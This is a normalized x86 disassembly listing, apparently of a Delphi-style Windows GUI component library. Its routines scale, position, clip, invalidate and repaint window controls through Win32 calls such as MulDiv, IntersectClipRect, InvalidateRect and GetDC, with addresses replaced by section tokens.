je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
cmp edi eax
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40484c
test edi edi
je r-xdata
cmp [ eax + 0x1ac ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45011b
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov [ ebp - 0x8 ] eax
cmp edi 0xffffffff
je r-xdata
cmp edi 0xffffffff
je r-xdata
mov eax [ eax + 0x1ac ]
mov edx [ ebp - 0x4 ]
call sub_4199dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
call sub_4202d8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x94 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] edi
test edi edi
je r-xdata
cmp [ edi + 0x1ac ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov si 0xffbe
call sub_40484c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc4
call sub_40484c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
call sub_420098
jmp r-xdata
mov eax [ edi + 0x1ac ]
mov edx [ ebp - 0x4 ]
call sub_419740
sub_450124
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_450cec
mov edx edi
mov eax ebx
call sub_4501d4
mov edx edi
mov eax ebx
call sub_451bf4
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_450190
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x15c ]
mov edx esi
call sub_405584
pop esi
pop ebx
retn
mov [ ebx + 0x158 ] 0x0
sub_4501d4
push ebx
push esi
push edi
mov ecx [ edx + 0x8 ]
mov esi [ edx ]
sub ecx esi
push ecx
mov ecx [ edx + 0xc ]
mov edi [ edx + 0x4 ]
sub ecx edi
push ecx
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
retn
sub_450228
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_450254
mov edx eax
mov ecx esp
mov eax esi
call sub_418420
mov edx esp
mov eax ebx
call sub_450720
pop ecx
pop edx
pop esi
pop ebx
retn
sub_45026c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_450210
mov ecx esp
mov edx esi
call sub_418420
mov edx esp
mov eax ebx
call sub_450720
pop ecx
pop edx
pop esi
pop ebx
retn
sub_450294
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_450315
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45031c
lea eax [ ebp - 0xc ]
call sub_405530
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
sub_450324
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_450350
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x74 ]
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_44f208
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_44f208
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_44f208
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_44f208
sub_4503d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_450400
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_440f80
sub_450430
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0x94 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_451b4c
sub_45049c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
movzx eax [ r-xdata ]
mov [ esi + 0x8c ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
movzx ebx [ r-xdata ]
movzx ebx [ esi + 0x8c ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x175 ]
push eax
call MulDiv
mov [ esi + 0x175 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x179 ]
push eax
call MulDiv
mov [ esi + 0x179 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_450350
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_424a40
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_424a5c
sub_45067c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_450712
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420534
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_450894
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_405974
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450719
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4508c4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_450720
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_450768
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
test esi esi
je r-xdata
mov edx ebx
call sub_45460c
mov edx ebx
mov eax esi
call sub_454518
mov eax ebx
call sub_44fda0
sub_4507b4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40484c
mov [ edi + 0x57 ] bl
push 0x0
movzx ecx bl
mov edx 0xb00b
mov eax edi
call sub_451b4c
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
sub_450848
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x80 ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_438804
mov edx ebx
mov eax esi
call sub_420098
sub_450870
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_451b4c
pop ebx
retn
sub_450894
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_450804
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_405620
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_450814
sub_4508c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_450919
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_450894
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405974
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450920
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax esi
call sub_4059dc
mov edx eax
mov eax ebx
call sub_450870
sub_450944
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_42499c
cmp eax [ ebx + 0x88 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_451b4c
pop ebx
retn
or [ ebx + 0x8c ] 0x10
mov eax [ ebx + 0x68 ]
call sub_42499c
mov [ ebx + 0x88 ] eax
sub_450a08
push ebx
mov ebx eax
cmp edx [ ebx + 0x70 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x5a ] 0x0
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00d
mov eax ebx
call sub_451b4c
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_450ad0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_450ac0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_44d668
mov eax esi
call sub_44d668
jmp r-xdata
sub_450b0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x1cc ]
mov edx ebx
call sub_4198f4
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x1cc ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41978c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1cc ]
mov ecx ebx
mov edx esi
call sub_419914
mov cl 0x1
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_450cec
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_43bda0
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd0
call sub_40484c
sub_450b94
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_450b0c
mov edx [ ecx + 0x1cc ]
mov edx [ edx + 0x8 ]
dec edx
call sub_450b0c
jmp r-xdata
sub_450bb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_450c4e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c55
lea eax [ ebp - 0xc ]
call sub_405530
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
sub_450c60
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x1cc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4198f4
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_419898
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4501b4
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450cec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_458904
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4501b4
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4585f8
push eax
call InvalidateRect
push ebp
call sub_450c60
pop ecx
test al al
je r-xdata
mov al 0x1
sub_450d8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x2 ] 0x0
cmp [ eax + 0x12a ] 0x0
je r-xdata
movzx eax [ ebp - 0x2 ]
pop ebx
pop ecx
pop ebp
retn 0xc
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x2 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_450dd4
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_43bd90
mov ebp eax
call sub_44d640
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp ebp esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
retn
test ebp ebp
je r-xdata
cmp edi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_451b4c
mov edx [ esp ]
mov [ edx + 0xc ] eax
cmp edi ebp
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax ebp
mov si 0xffc9
call sub_40484c
jmp r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_450e68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_458904
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4585f8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_450f41
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_455ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4585f8
push eax
call ReleaseDC
retn
sub_450fd0
push ebx
push esi
push edi
add esp 0xffffffec
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ rw-data ]
call sub_45d5a4
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d664
mov eax edi
call sub_451b80
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x8f ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax edi
call sub_4503d4
mov eax [ esp + 0xc ]
mov [ esp ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_451b4c
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_44e864
sub_4510cc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_451108
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_451154
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_451180
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_450834
mov edi eax
mov eax [ ebx + 0x40 ]
call sub_450820
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x30 ]
fild [ ebx + 0x14 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x4c ]
fld [ esp ]
call sub_403450
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_403450
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x4c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x1db ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x8 ]
call sub_4585f8
push eax
call GetWindowRect
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
movzx edx [ ebx + 0x5c ]
push edx
lea edx [ ebx + 0x4c ]
push edx
mov eax [ eax + 0x1b0 ]
mov ecx [ ebx + 0x60 ]
mov edx [ ebx + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_45126c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4512b8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
push eax
movzx ecx [ edi + 0xd ]
movzx edx [ edi + 0xc ]
mov eax ebp
mov si 0xffd5
call sub_40484c
and eax 0x7f
mov [ ebx + 0xc ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4512ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov edi eax
mov [ ebp - 0xa ] 0x0
cmp [ edi + 0x142 ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push ebx
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
movzx ecx [ ebp - 0x1 ]
mov edx edi
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
movzx eax [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ edi + 0x98 ] ebx
jmp r-xdata
mov eax [ edi + 0x98 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
cmp [ edi + 0x98 ] 0x0
setl bl
mov eax [ edi + 0x98 ]
cdq
xor eax edx
sub eax edx
sub eax 0x78
mov [ edi + 0x98 ] eax
test bl bl
je r-xdata
lea ecx [ ebp - 0x9 ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe0
call sub_40484c
mov [ ebp - 0xa ] al
